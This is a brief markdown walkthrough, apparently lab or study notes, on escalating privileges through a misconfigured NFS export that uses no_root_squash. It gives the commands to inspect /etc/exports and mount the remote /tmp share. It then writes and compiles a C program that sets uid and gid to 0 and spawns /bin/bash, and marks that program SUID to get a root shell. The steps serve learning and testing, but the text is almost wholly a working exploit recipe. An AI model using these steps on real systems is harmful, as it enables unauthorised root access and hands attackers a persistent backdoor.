# Detection 

```bash
cat /etc/exports
```

![image](https://user-images.githubusercontent.com/96658935/147764250-ba9636f7-ff5c-4201-a298-306d05ae8ed1.png)


From the output, notice that “no_root_squash” option is defined for the “/tmp” export

```bash
showmount -e 10.10.10.10
```

![image](https://user-images.githubusercontent.com/96658935/147764360-cac84d6f-4f74-407b-80ee-adbbcd2b1df0.png)


```bash
mkdir /tmp/1
```

```bash
mount -o rw,vers=2 10.10.108.52:/tmp /tmp/1
```

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
```


```bash
gcc /tmp/1/x.c -o /tmp/1/x
```

```bash
chmod +s /tmp/1/x
```


![image](https://user-images.githubusercontent.com/96658935/147765264-d9b94d3c-65aa-4d5b-99fc-02e4cee6aa21.png)


![image](https://user-images.githubusercontent.com/96658935/147765202-4dcfa7d1-5b1c-4668-ba97-b86abf62236b.png)




